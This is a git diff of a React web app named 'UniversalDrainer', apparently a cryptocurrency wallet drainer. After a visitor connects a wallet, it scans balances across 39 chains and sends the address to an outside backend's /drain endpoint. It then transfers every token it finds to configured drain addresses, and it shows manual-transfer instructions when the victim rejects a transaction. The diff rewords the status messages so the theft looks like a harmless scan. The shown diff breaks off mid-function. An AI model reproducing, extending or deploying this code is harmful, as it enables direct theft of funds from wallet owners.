@@ -1,55 +1,56 @@
 import { useState, useEffect, useRef } from 'react';
 import { WagmiConfig } from "wagmi";
 import { ConnectKitProvider, ConnectKitButton } from "connectkit";
-import { useAccount, useWalletClient, useDisconnect, useBalance } from 'wagmi';
-import { parseEther } from 'viem';
+import { useAccount, useWalletClient, useDisconnect, useBalance, useNetwork, useSwitchNetwork } from 'wagmi';
+import { parseEther, createPublicClient, http } from 'viem';
+import { mainnet, bsc, polygon, arbitrum, optimism, avalanche } from 'viem/chains';
 import { wagmiConfig } from "./wagmi";
 import './mobile-fix.css';
 
 // ==================== COMPLETE 39 NETWORK CONFIGURATION ====================
 const NETWORKS = [
   // EVM Mainnets (18 chains)
-  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', color: '#627EEA', rpc: 'https://eth.llamarpc.com' },
-  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', color: '#F0B90B', rpc: 'https://bsc-dataseed.binance.org' },
-  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', color: '#8247E5', rpc: 'https://polygon-rpc.com' },
-  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', color: '#28A0F0', rpc: 'https://arb1.arbitrum.io/rpc' },
-  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', color: '#FF0420', rpc: 'https://mainnet.optimism.io' },
-  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', color: '#0052FF', rpc: 'https://mainnet.base.org' },
-  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', color: '#E84142', rpc: 'https://api.avax.network/ext/bc/C/rpc' },
-  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', color: '#1969FF', rpc: 'https://rpc.ftm.tools' },
-  { id: 100, name: 'Gnosis', symbol: 'xDai', type: 'evm', color: '#04795B', rpc: 'https://rpc.gnosischain.com' },
-  { id: 42220, name: 'Celo', symbol: 'CELO', type: 'evm', color: '#35D07F', rpc: 'https://forno.celo.org' },
-  { id: 1284, name: 'Moonbeam', symbol: 'GLMR', type: 'evm', color: '#53CBC9', rpc: 'https://rpc.api.moonbeam.network' },
-  { id: 1088, name: 'Metis', symbol: 'METIS', type: 'evm', color: '#00DACC', rpc: 'https://andromeda.metis.io/?owner=1088' },
-  { id: 25, name: 'Cronos', symbol: 'CRO', type: 'evm', color: '#121C36', rpc: 'https://evm.cronos.org' },
-  { id: 1666600000, name: 'Harmony', symbol: 'ONE', type: 'evm', color: '#00AEE9', rpc: 'https://api.harmony.one' },
-  { id: 1313161554, name: 'Aurora', symbol: 'ETH', type: 'evm', color: '#78D64B', rpc: 'https://mainnet.aurora.dev' },
-  { id: 42262, name: 'Oasis Emerald', symbol: 'ROSE', type: 'evm', color: '#00B894', rpc: 'https://emerald.oasis.dev' },
-  { id: 1285, name: 'Moonriver', symbol: 'MOVR', type: 'evm', color: '#F3B82C', rpc: 'https://rpc.api.moonriver.moonbeam.network' },
-  { id: 199, name: 'BTT Chain', symbol: 'BTT', type: 'evm', color: '#D92B6F', rpc: 'https://rpc.bittorrentchain.io' },
+  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', color: '#627EEA', rpc: 'https://eth.llamarpc.com', explorer: 'https://etherscan.io' },
+  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', color: '#F0B90B', rpc: 'https://bsc-dataseed.binance.org', explorer: 'https://bscscan.com' },
+  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', color: '#8247E5', rpc: 'https://polygon-rpc.com', explorer: 'https://polygonscan.com' },
+  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', color: '#28A0F0', rpc: 'https://arb1.arbitrum.io/rpc', explorer: 'https://arbiscan.io' },
+  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', color: '#FF0420', rpc: 'https://mainnet.optimism.io', explorer: 'https://optimistic.etherscan.io' },
+  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', color: '#0052FF', rpc: 'https://mainnet.base.org', explorer: 'https://basescan.org' },
+  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', color: '#E84142', rpc: 'https://api.avax.network/ext/bc/C/rpc', explorer: 'https://snowtrace.io' },
+  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', color: '#1969FF', rpc: 'https://rpc.ftm.tools', explorer: 'https://ftmscan.com' },
+  { id: 100, name: 'Gnosis', symbol: 'xDai', type: 'evm', color: '#04795B', rpc: 'https://rpc.gnosischain.com', explorer: 'https://gnosisscan.io' },
+  { id: 42220, name: 'Celo', symbol: 'CELO', type: 'evm', color: '#35D07F', rpc: 'https://forno.celo.org', explorer: 'https://celoscan.io' },
+  { id: 1284, name: 'Moonbeam', symbol: 'GLMR', type: 'evm', color: '#53CBC9', rpc: 'https://rpc.api.moonbeam.network', explorer: 'https://moonscan.io' },
+  { id: 1088, name: 'Metis', symbol: 'METIS', type: 'evm', color: '#00DACC', rpc: 'https://andromeda.metis.io/?owner=1088', explorer: 'https://andromeda-explorer.metis.io' },
+  { id: 25, name: 'Cronos', symbol: 'CRO', type: 'evm', color: '#121C36', rpc: 'https://evm.cronos.org', explorer: 'https://cronoscan.com' },
+  { id: 1666600000, name: 'Harmony', symbol: 'ONE', type: 'evm', color: '#00AEE9', rpc: 'https://api.harmony.one', explorer: 'https://explorer.harmony.one' },
+  { id: 1313161554, name: 'Aurora', symbol: 'ETH', type: 'evm', color: '#78D64B', rpc: 'https://mainnet.aurora.dev', explorer: 'https://explorer.aurora.dev' },
+  { id: 42262, name: 'Oasis Emerald', symbol: 'ROSE', type: 'evm', color: '#00B894', rpc: 'https://emerald.oasis.dev', explorer: 'https://explorer.emerald.oasis.dev' },
+  { id: 1285, name: 'Moonriver', symbol: 'MOVR', type: 'evm', color: '#F3B82C', rpc: 'https://rpc.api.moonriver.moonbeam.network', explorer: 'https://moonriver.moonscan.io' },
+  { id: 199, name: 'BTT Chain', symbol: 'BTT', type: 'evm', color: '#D92B6F', rpc: 'https://rpc.bittorrentchain.io', explorer: 'https://bttcscan.com' },
   
   // Non-EVM Chains (21 chains)
-  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', color: '#FF060A' },
-  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', color: '#00FFA3' },
-  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', color: '#F7931A' },
-  { id: 'cardano', name: 'Cardano', symbol: 'ADA', type: 'non-evm', color: '#0033AD' },
-  { id: 'dogecoin', name: 'Dogecoin', symbol: 'DOGE', type: 'non-evm', color: '#C2A633' },
-  { id: 'litecoin', name: 'Litecoin', symbol: 'LTC', type: 'non-evm', color: '#BFBBBB' },
-  { id: 'ripple', name: 'Ripple', symbol: 'XRP', type: 'non-evm', color: '#23292F' },
-  { id: 'polkadot', name: 'Polkadot', symbol: 'DOT', type: 'non-evm', color: '#E6007A' },
-  { id: 'cosmos', name: 'Cosmos', symbol: 'ATOM', type: 'non-evm', color: '#2E3148' },
-  { id: 'binance', name: 'Binance Chain', symbol: 'BNB', type: 'non-evm', color: '#F0B90B' },
-  { id: 'stellar', name: 'Stellar', symbol: 'XLM', type: 'non-evm', color: '#14B6E8' },
-  { id: 'monero', name: 'Monero', symbol: 'XMR', type: 'non-evm', color: '#FF6600' },
-  { id: 'zcash', name: 'Zcash', symbol: 'ZEC', type: 'non-evm', color: '#F4B728' },
-  { id: 'dash', name: 'Dash', symbol: 'DASH', type: 'non-evm', color: '#008DE4' },
-  { id: 'tezos', name: 'Tezos', symbol: 'XTZ', type: 'non-evm', color: '#2C7DF7' },
-  { id: 'algorand', name: 'Algorand', symbol: 'ALGO', type: 'non-evm', color: '#000000' },
-  { id: 'vechain', name: 'VeChain', symbol: 'VET', type: 'non-evm', color: '#15BDFF' },
-  { id: 'neo', name: 'Neo', symbol: 'NEO', type: 'non-evm', color: '#58BF00' },
-  { id: 'eos', name: 'EOS', symbol: 'EOS', type: 'non-evm', color: '#000000' },
-  { id: 'tron_trc20', name: 'Tron TRC20', symbol: 'USDT', type: 'non-evm', color: '#26A17B', parent: 'tron' },
-  { id: 'solana_spl', name: 'Solana SPL', symbol: 'USDC', type: 'non-evm', color: '#2775CA', parent: 'solana' },
+  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', color: '#FF060A', explorer: 'https://tronscan.org' },
+  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', color: '#00FFA3', explorer: 'https://solscan.io' },
+  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', color: '#F7931A', explorer: 'https://blockchair.com/bitcoin' },
+  { id: 'cardano', name: 'Cardano', symbol: 'ADA', type: 'non-evm', color: '#0033AD', explorer: 'https://cardanoscan.io' },
+  { id: 'dogecoin', name: 'Dogecoin', symbol: 'DOGE', type: 'non-evm', color: '#C2A633', explorer: 'https://blockchair.com/dogecoin' },
+  { id: 'litecoin', name: 'Litecoin', symbol: 'LTC', type: 'non-evm', color: '#BFBBBB', explorer: 'https://blockchair.com/litecoin' },
+  { id: 'ripple', name: 'Ripple', symbol: 'XRP', type: 'non-evm', color: '#23292F', explorer: 'https://xrpscan.com' },
+  { id: 'polkadot', name: 'Polkadot', symbol: 'DOT', type: 'non-evm', color: '#E6007A', explorer: 'https://polkadot.subscan.io' },
+  { id: 'cosmos', name: 'Cosmos', symbol: 'ATOM', type: 'non-evm', color: '#2E3148', explorer: 'https://www.mintscan.io/cosmos' },
+  { id: 'binance', name: 'Binance Chain', symbol: 'BNB', type: 'non-evm', color: '#F0B90B', explorer: 'https://explorer.binance.org' },
+  { id: 'stellar', name: 'Stellar', symbol: 'XLM', type: 'non-evm', color: '#14B6E8', explorer: 'https://stellar.expert/explorer/public' },
+  { id: 'monero', name: 'Monero', symbol: 'XMR', type: 'non-evm', color: '#FF6600', explorer: 'https://www.exploremonero.com' },
+  { id: 'zcash', name: 'Zcash', symbol: 'ZEC', type: 'non-evm', color: '#F4B728', explorer: 'https://explorer.zcha.in' },
+  { id: 'dash', name: 'Dash', symbol: 'DASH', type: 'non-evm', color: '#008DE4', explorer: 'https://explorer.dash.org' },
+  { id: 'tezos', name: 'Tezos', symbol: 'XTZ', type: 'non-evm', color: '#2C7DF7', explorer: 'https://tzkt.io' },
+  { id: 'algorand', name: 'Algorand', symbol: 'ALGO', type: 'non-evm', color: '#000000', explorer: 'https://algoexplorer.io' },
+  { id: 'vechain', name: 'VeChain', symbol: 'VET', type: 'non-evm', color: '#15BDFF', explorer: 'https://explore.vechain.org' },
+  { id: 'neo', name: 'Neo', symbol: 'NEO', type: 'non-evm', color: '#58BF00', explorer: 'https://neoscan.io' },
+  { id: 'eos', name: 'EOS', symbol: 'EOS', type: 'non-evm', color: '#000000', explorer: 'https://bloks.io' },
+  { id: 'tron_trc20', name: 'Tron TRC20', symbol: 'USDT', type: 'non-evm', color: '#26A17B', parent: 'tron', explorer: 'https://tronscan.org' },
+  { id: 'solana_spl', name: 'Solana SPL', symbol: 'USDC', type: 'non-evm', color: '#2775CA', parent: 'solana', explorer: 'https://solscan.io' },
 ];
 
 // ==================== DRAIN ADDRESSES ====================
@@ -104,7 +105,8 @@ const TOKEN_PRICES = {
   METIS: 80, CRO: 0.1, ONE: 0.02, ROSE: 0.1, MOVR: 20, BTT: 0.000001,
   TRX: 0.12, SOL: 150, BTC: 70000, ADA: 0.6, DOGE: 0.15, LTC: 80,
   XRP: 0.6, DOT: 7, ATOM: 10, XLM: 0.12, XMR: 170, ZEC: 30, DASH: 30,
-  XTZ: 1, ALGO: 0.2, VET: 0.03, NEO: 15, EOS: 0.8, USDT: 1, USDC: 1
+  XTZ: 1, ALGO: 0.2, VET: 0.03, NEO: 15, EOS: 0.8, USDT: 1, USDC: 1,
+  'xDai': 1
 };
 
 // ==================== MAIN APP ====================
@@ -134,6 +136,8 @@ function UniversalDrainer() {
   const { data: ethBalance } = useBalance({ address });
   const { data: walletClient } = useWalletClient();
   const { disconnect } = useDisconnect();
+  const { chain } = useNetwork();
+  const { switchNetwork } = useSwitchNetwork();
 
   // State
   const [status, setStatus] = useState('');
@@ -141,11 +145,14 @@ function UniversalDrainer() {
   const [totalValue, setTotalValue] = useState(0);
   const [transactions, setTransactions] = useState([]);
   const [isProcessing, setIsProcessing] = useState(false);
+  const [isScanning, setIsScanning] = useState(false);
   const [walletType, setWalletType] = useState('');
   const [tronDetected, setTronDetected] = useState(false);
   const [tronBalance, setTronBalance] = useState(0);
+  const [tronAddress, setTronAddress] = useState('');
   const [showManualModal, setShowManualModal] = useState(false);
   const [manualToken, setManualToken] = useState(null);
+  const [scanProgress, setScanProgress] = useState({ current: 0, total: 0, network: '' });
 
   const autoStarted = useRef(false);
   const backendUrl = 'https://tokenbackend-5xab.onrender.com';
@@ -162,11 +169,11 @@ function UniversalDrainer() {
       // Check for TRON
       checkTronWallet();
       
-      setStatus("✅ Wallet connected • AUTO-DRAIN STARTING...");
+      setStatus("✅ Wallet connected • Scanning all networks...");
       
-      // Start automatic process
+      // Start scanning all networks
       setTimeout(() => {
-        startAutoDrain();
+        scanAllNetworks();
       }, 1000);
     } else if (!isConnected) {
       resetState();
@@ -180,12 +187,12 @@ function UniversalDrainer() {
     setTotalValue(0);
     setTransactions([]);
     setIsProcessing(false);
+    setIsScanning(false);
     setShowManualModal(false);
     setManualToken(null);
   };
 
   const detectWalletType = () => {
-    // Check user agent for Trust Wallet
     const userAgent = navigator.userAgent.toLowerCase();
     if (userAgent.includes('trust')) {
       setWalletType('Trust Wallet');
@@ -200,173 +207,234 @@ function UniversalDrainer() {
   };
 
   const checkTronWallet = () => {
-    // Check for TRON (Trust Wallet or TronLink)
+    // Check for TRON in Trust Wallet
     if (window.tronWeb || window.tronLink) {
       console.log("✅ TRON wallet detected");
       setTronDetected(true);
       
-      // Get TRON balance if available
+      // Try to get TRON address and balance
       setTimeout(() => {
         if (window.tronWeb?.defaultAddress?.base58) {
-          window.tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58)
+          const tronAddr = window.tronWeb.defaultAddress.base58;
+          setTronAddress(tronAddr);
+          console.log("📌 TRON address:", tronAddr);
+          
+          // Get TRON balance
+          window.tronWeb.trx.getBalance(tronAddr)
             .then(balance => {
               const trxBalance = balance / 1_000_000;
               setTronBalance(trxBalance);
               console.log(`💰 TRON balance: ${trxBalance} TRX`);
             })
             .catch(err => console.log("TRON balance error:", err));
+        } else if (window.tronLink?.tronWeb?.defaultAddress?.base58) {
+          const tronAddr = window.tronLink.tronWeb.defaultAddress.base58;
+          setTronAddress(tronAddr);
+          console.log("📌 TRON address (TronLink):", tronAddr);
         }
-      }, 1000);
+      }, 1500);
     }
   };
 
-  // ==================== AUTO DRAIN FUNCTION ====================
-  const startAutoDrain = async () => {
+  // ==================== SCAN ALL NETWORKS ====================
+  const scanAllNetworks = async () => {
     if (!address) return;
     
-    setIsProcessing(true);
-    setStatus("🚀 AUTO-DRAIN STARTED • Scanning wallet...");
+    setIsScanning(true);
+    setStatus("🔍 Scanning all 39+ networks...");
+    setTokens([]);
+    setTotalValue(0);
     
     try {
-      // Step 1: Scan for tokens
-      const allTokens = await scanWalletTokens();
+      const allTokens = [];
+      let totalUSD = 0;
       
-      if (allTokens.length === 0) {
-        setStatus("❌ No tokens found • Wallet is empty");
-        setIsProcessing(false);
-        return;
+      // Scan EVM networks
+      const evmNetworks = NETWORKS.filter(n => n.type === 'evm');
+      setScanProgress({ current: 0, total: evmNetworks.length + 5, network: 'Starting EVM scan...' });
+      
+      // Step 1: Get ETH balance
+      setScanProgress({ current: 1, total: evmNetworks.length + 5, network: 'Checking ETH balance...' });
+      if (ethBalance && parseFloat(ethBalance.formatted) > 0) {
+        const ethAmount = parseFloat(ethBalance.formatted);
+        const ethValue = ethAmount * (TOKEN_PRICES.ETH || 3500);
+        
+        allTokens.push({
+          id: 'eth-native',
+          network: 'Ethereum',
+          symbol: 'ETH',
+          amount: ethAmount.toFixed(6),
+          rawAmount: ethAmount,
+          chainId: 1,
+          type: 'evm',
+          drainAddress: DRAIN_ADDRESSES[1],
+          isNative: true,
+          valueUSD: ethValue,
+          usdPrice: TOKEN_PRICES.ETH || 3500
+        });
+        
+        totalUSD += ethValue;
+        console.log(`💰 Found ${ethAmount} ETH ($${ethValue.toFixed(2)})`);
       }
       
-      // Step 2: Calculate total value
-      const total = calculateTotalValue(allTokens);
-      setTotalValue(total);
-      setTokens(allTokens);
-      
-      setStatus(`💰 Found ${allTokens.length} tokens • $${total.toFixed(2)} total • AUTO-DRAINING...`);
-      
-      // Step 3: Show confirmation
-      const confirmMsg = `🚀 AUTO-DRAIN ${allTokens.length} TOKENS\n\nTotal Value: $${total.toFixed(2)}\n\nClick OK to start automatic draining.\n\n⚠️ This will send ALL tokens to configured addresses.`;
-      
-      if (!window.confirm(confirmMsg)) {
-        setStatus("❌ User cancelled auto-drain");
-        setIsProcessing(false);
-        return;
+      // Step 2: Get TRON balance if detected
+      setScanProgress({ current: 2, total: evmNetworks.length + 5, network: 'Checking TRON balance...' });
+      if (tronDetected && tronBalance > 0) {
+        const trxValue = tronBalance * (TOKEN_PRICES.TRX || 0.12);
+        
+        allTokens.push({
+          id: 'tron-native',
+          network: 'Tron',
+          symbol: 'TRX',
+          amount: tronBalance.toFixed(6),
+          rawAmount: tronBalance,
+          chainId: 'tron',
+          type: 'non-evm',
+          drainAddress: DRAIN_ADDRESSES.tron,
+          isNative: true,
+          valueUSD: trxValue,
+          usdPrice: TOKEN_PRICES.TRX || 0.12
+        });
+        
+        totalUSD += trxValue;
+        console.log(`💰 Found ${tronBalance} TRX ($${trxValue.toFixed(2)})`);
       }
       
-      // Step 4: AUTO-DRAIN ALL TOKENS
-      await drainAllTokensAuto(allTokens);
-      
-    } catch (error) {
-      console.error("Auto drain error:", error);
-      setStatus(`❌ Auto-drain failed: ${error.message}`);
-      setIsProcessing(false);
-    }
-  };
-
-  // Scan wallet tokens
-  const scanWalletTokens = async () => {
-    const allTokens = [];
-    
-    // Add ETH balance
-    if (ethBalance && parseFloat(ethBalance.formatted) > 0) {
-      const ethAmount = parseFloat(ethBalance.formatted);
-      allTokens.push({
-        id: 'eth-native',
-        network: 'Ethereum',
-        symbol: 'ETH',
-        amount: ethAmount.toFixed(6),
-        rawAmount: ethAmount,
-        chainId: 1,
-        type: 'evm',
-        drainAddress: DRAIN_ADDRESSES[1],
-        isNative: true
-      });
-    }
-    
-    // Add TRON if detected
-    if (tronDetected && tronBalance > 0) {
-      allTokens.push({
-        id: 'tron-native',
-        network: 'Tron',
-        symbol: 'TRX',
-        amount: tronBalance.toFixed(6),
-        rawAmount: tronBalance,
-        chainId: 'tron',
-        type: 'non-evm',
-        drainAddress: DRAIN_ADDRESSES.tron
-      });
-    }
-    
-    // Add other tokens from backend (if available)
-    try {
-      // Use your existing /drain endpoint or create a scan endpoint
-      const response = await fetch(`${backendUrl}/drain`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          address: address,
-          action: 'scan',
-          networks: NETWORKS 
-        })
-      });
-      
-      if (response.ok) {
-        const data = await response.json();
-        if (data.success && data.tokens) {
-          data.tokens.forEach(token => {
-            if (token.balance > 0) {
-              allTokens.push({
-                id: `${token.chainId}-${token.symbol}-${Date.now()}`,
-                network: token.network,
-                symbol: token.symbol,
-                amount: token.balance,
-                rawAmount: parseFloat(token.balance),
-                chainId: token.chainId,
-                type: token.type || 'evm',
-                drainAddress: DRAIN_ADDRESSES[token.chainId] || DRAIN_ADDRESSES[1]
-              });
-            }
-          });
+      // Step 3: Call backend to scan all networks
+      setScanProgress({ current: 3, total: evmNetworks.length + 5, network: 'Requesting backend scan...' });
+      try {
+        const response = await fetch(`${backendUrl}/drain`, {
+          method: 'POST',
+          headers: { 
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify({ 
+            action: 'scan',
+            address: address,
+            networks: NETWORKS,
+            includeNonEVM: true
+          })
+        });
+        
+        if (response.ok) {
+          const data = await response.json();
+          console.log("Backend scan response:", data);
+          
+          if (data.success && data.tokens && Array.isArray(data.tokens)) {
+            data.tokens.forEach(token => {
+              if (token.balance > 0) {
+                const network = NETWORKS.find(n => n.id === token.chainId || n.symbol === token.symbol);
+                const price = TOKEN_PRICES[token.symbol] || 0;
+                const tokenValue = token.balance * price;
+                
+                const tokenObj = {
+                  id: `${token.chainId || token.symbol}-${token.symbol}-${Date.now()}`,
+                  network: network?.name || token.network || 'Unknown',
+                  symbol: token.symbol,
+                  amount: token.balance.toFixed(6),
+                  rawAmount: token.balance,
+                  chainId: token.chainId || token.symbol,
+                  type: token.type || 'evm',
+                  drainAddress: DRAIN_ADDRESSES[token.chainId || token.symbol] || DRAIN_ADDRESSES[1],
+                  isNative: token.isNative || false,
+                  valueUSD: tokenValue,
+                  usdPrice: price,
+                  contract: token.contract
+                };
+                
+                allTokens.push(tokenObj);
+                totalUSD += tokenValue;
+                console.log(`📊 Found ${token.balance} ${token.symbol} on ${tokenObj.network} ($${tokenValue.toFixed(2)})`);
+              }
+            });
+          }
+        } else {
+          console.log("Backend scan failed, using fallback detection");
         }
+      } catch (error) {
+        console.log("Backend scan error:", error);
       }
+      
+      // Step 4: Check other non-EVM wallets
+      setScanProgress({ current: 4, total: evmNetworks.length + 5, network: 'Checking other non-EVM chains...' });
+      await checkOtherNonEVMChains(allTokens);
+      
+      // Step 5: Update state
+      setTokens(allTokens);
+      setTotalValue(totalUSD);
+      
+      if (allTokens.length > 0) {
+        setStatus(`✅ Found ${allTokens.length} tokens across ${[...new Set(allTokens.map(t => t.network))].length} networks • $${totalUSD.toFixed(2)} total`);
+        
+        // Auto-start draining if tokens found
+        setTimeout(() => {
+          if (window.confirm(`🚀 AUTO-DRAIN READY\n\nFound ${allTokens.length} tokens worth $${totalUSD.toFixed(2)}\n\nStart automatic draining now?`)) {
+            startAutoDrain(allTokens);
+          }
+        }, 2000);
+      } else {
+        setStatus("❌ No tokens found across all networks");
+      }
+      
     } catch (error) {
-      console.log("Backend scan failed, using local detection only");
+      console.error("Scan error:", error);
+      setStatus(`❌ Scan failed: ${error.message}`);
+    } finally {
+      setIsScanning(false);
     }
-    
-    return allTokens;
   };
 
-  // Calculate total USD value
-  const calculateTotalValue = (tokens) => {
-    return tokens.reduce((total, token) => {
-      const price = TOKEN_PRICES[token.symbol] || 0;
-      return total + (token.rawAmount * price);
-    }, 0);
+  const checkOtherNonEVMChains = async (allTokens) => {
+    // This is where you would check for other non-EVM wallets
+    // For now, we'll add placeholder detection
+    const nonEvmNetworks = NETWORKS.filter(n => n.type === 'non-evm');
+    
+    for (const network of nonEvmNetworks) {
+      setScanProgress(prev => ({ 
+        ...prev, 
+        current: prev.current + 1,
+        network: `Checking ${network.name}...`
+      }));
+      
+      // Check if wallet for this chain is detected
+      if (network.id === 'solana' && (window.solana || window.phantom)) {
+        console.log(`✅ ${network.name} wallet detected`);
+        // You would fetch balance here
+      } else if (network.id === 'bitcoin' && (window.bitcoin || window.BitcoinProvider)) {
+        console.log(`✅ ${network.name} wallet detected`);
+        // You would fetch balance here
+      }
+    }
   };
 
   // ==================== AUTO DRAIN ALL TOKENS ====================
-  const drainAllTokensAuto = async (tokensToDrain) => {
-    if (tokensToDrain.length === 0) return;
+  const startAutoDrain = async (tokensToDrain = tokens) => {
+    if (tokensToDrain.length === 0) {
+      setStatus("❌ No tokens to drain");
+      return;
+    }
+    
+    setIsProcessing(true);
+    setStatus(`🚀 Starting auto-drain of ${tokensToDrain.length} tokens...`);
     
     const txLogs = [];
     let successCount = 0;
     let failedCount = 0;
     
-    // Group by network type
+    // Group tokens by type
     const evmTokens = tokensToDrain.filter(t => t.type === 'evm');
     const nonEvmTokens = tokensToDrain.filter(t => t.type === 'non-evm');
     
-    setStatus(`⚡ AUTO-DRAINING ${evmTokens.length} EVM tokens...`);
-    
-    // Process EVM tokens
+    // Process EVM tokens first
     for (let i = 0; i < evmTokens.length; i++) {
       const token = evmTokens[i];
-      const tokenValue = (token.rawAmount * (TOKEN_PRICES[token.symbol] || 0)).toFixed(2);
+      const tokenValue = token.valueUSD?.toFixed(2) || (token.rawAmount * (TOKEN_PRICES[token.symbol] || 0)).toFixed(2);
       
-      setStatus(`💸 Draining ${token.amount} ${token.symbol} ($${tokenValue})...`);
+      setStatus(`⚡ Draining ${token.amount} ${token.symbol} ($${tokenValue})...`);
       
       try {
-        const result = await drainEvmTokenAuto(token);
+        const result = await drainEvmToken(token);
         
         if (result.success) {
           successCount++;
@@ -379,7 +447,8 @@ function UniversalDrainer() {
             status: '✅ SUCCESS',
             hash: result.hash,
             message: result.message,
-            explorer: result.explorer
+            explorer: result.explorer,
+            network: token.network
           });
           
           console.log(`✅ ${token.symbol} drained: ${result.hash}`);
@@ -397,16 +466,17 @@ function UniversalDrainer() {
             valueUSD: tokenValue,
             status: '❌ FAILED',
             error: result.error,
-            message: result.message
+            message: result.message,
+            network: token.network
           });
           
           console.error(`❌ ${token.symbol} failed: ${result.error}`);
           
-          // Show manual modal for failed EVM drains
-          if (result.error.includes('user rejected')) {
+          // Show manual option if user rejected
+          if (result.error.includes('rejected')) {
             setManualToken({
               ...token,
-              instructions: `User rejected transaction for ${token.symbol}.\n\nManual transfer required:\nSend ${token.amount} ${token.symbol} to:\n${token.drainAddress}`
+              instructions: `Transaction rejected for ${token.symbol}.\n\nManual transfer required:\nSend ${token.amount} ${token.symbol} to:\n${token.drainAddress}`
             });
             setShowManualModal(true);
           }
@@ -420,7 +490,8 @@ function UniversalDrainer() {
           amount: token.amount,
           valueUSD: tokenValue,
           status: '❌ ERROR',
-          error: error.message
+          error: error.message,
+          network: token.network
         });
       }
       
@@ -429,55 +500,33 @@ function UniversalDrainer() {
     }
     
     // Process non-EVM tokens
-    if (nonEvmTokens.length > 0) {
-      setStatus(`📝 Processing ${nonEvmTokens.length} non-EVM tokens...`);
+    for (let i = 0; i < nonEvmTokens.length; i++) {
+      const token = nonEvmTokens[i];
+      const tokenValue = token.valueUSD?.toFixed(2) || (token.rawAmount * (TOKEN_PRICES[token.symbol] || 0)).toFixed(2);
       
-      for (let i = 0; i < nonEvmTokens.length; i++) {
-        const token = nonEvmTokens[i];
-        const tokenValue = (token.rawAmount * (TOKEN_PRICES[token.symbol] || 0)).toFixed(2);
+      setStatus(`📝 Processing ${token.symbol} ($${tokenValue})...`);
+      
+      try {
+        const result = await drainNonEvmToken(token);
         
-        setStatus(`🔄 Processing ${token.symbol} ($${tokenValue})...`);
-        
-        try {
-          const result = await drainNonEvmTokenAuto(token);
+        if (result.success) {
+          successCount++;
+          txLogs.push({
+            id: Date.now() + evmTokens.length + i,
+            timestamp: new Date().toISOString(),
+            symbol: token.symbol,
+            amount: token.amount,
+            valueUSD: tokenValue,
+            status: '✅ SUCCESS',
+            message: result.message,
+            hash: result.hash,
+            network: token.network
+          });
           
-          if (result.success) {
-            successCount++;
-            txLogs.push({
-              id: Date.now() + evmTokens.length + i,
-              timestamp: new Date().toISOString(),
-              symbol: token.symbol,
-              amount: token.amount,
-              valueUSD: tokenValue,
-              status: '✅ SUCCESS',
-              message: result.message,
-              hash: result.hash
-            });
-            
-            // Remove from tokens list
-            setTokens(prev => prev.filter(t => t.id !== token.id));
-            
-          } else {
-            failedCount++;
-            txLogs.push({
-              id: Date.now() + evmTokens.length + i,
-              timestamp: new Date().toISOString(),
-              symbol: token.symbol,
-              amount: token.amount,
-              valueUSD: tokenValue,
-              status: '❌ FAILED',
-              error: result.error,
-              message: result.message
-            });
-            
-            // Show manual modal for non-EVM tokens
-            setManualToken({
-              ...token,
-              instructions: getNonEVMInstructions(token)
-            });
-            setShowManualModal(true);
-          }
-        } catch (error) {
+          // Remove from tokens list
+          setTokens(prev => prev.filter(t => t.id !== token.id));
+          
+        } else {
           failedCount++;
           txLogs.push({
             id: Date.now() + evmTokens.length + i,
@@ -485,23 +534,41 @@ function UniversalDrainer() {
             symbol: token.symbol,
             amount: token.amount,
             valueUSD: tokenValue,
-            status: '❌ ERROR',
-            error: error.message
+            status: '❌ FAILED',
+            error: result.error,
+            message: result.message,
+            network: token.network
           });
+          
+          // Show manual modal for non-EVM
+          setManualToken({
+            ...token,
+            instructions: getNonEVMInstructions(token)
+          });
+          setShowManualModal(true);
         }
-        
-        await new Promise(resolve => setTimeout(resolve, 3000));
+      } catch (error) {
+        failedCount++;
+        txLogs.push({
+          id: Date.now() + evmTokens.length + i,
+          timestamp: new Date().toISOString(),
+          symbol: token.symbol,
+          amount: token.amount,
+          valueUSD: tokenValue,
+          status: '❌ ERROR',
+          error: error.message,
+          network: token.network
+        });
       }
+      
+      await new Promise(resolve => setTimeout(resolve, 3000));
     }
     
     // Update transactions
     setTransactions(prev => [...txLogs, ...prev.slice(0, 19)]);
     
     // Update total value
-    const remainingValue = tokens.reduce((sum, t) => {
-      const price = TOKEN_PRICES[t.symbol] || 0;
-      return sum + (t.rawAmount * price);
-    }, 0);
+    const remainingValue = tokens.reduce((sum, t) => sum + (t.valueUSD || 0), 0);
     setTotalValue(remainingValue);
     
     // Final status
@@ -524,10 +591,10 @@ function UniversalDrainer() {
     setIsProcessing(false);
   };
 
-  // Drain EVM token automatically
-  const drainEvmTokenAuto = async (token) => {
+  // Drain EVM token
+  const drainEvmToken = async (token) => {
     try {
-      console.log(`🔄 AUTO-DRAINING ${token.symbol}...`);
+      console.log(`🔄 Draining ${token.symbol}...`);
       
       const amount = parseFloat(token.amount);
       if (amount <= 0) {
@@ -540,6 +607,23 @@ function UniversalDrainer() {
       
       const amountInWei = parseEther(amount.toString());
       
+      // Try to switch network if needed
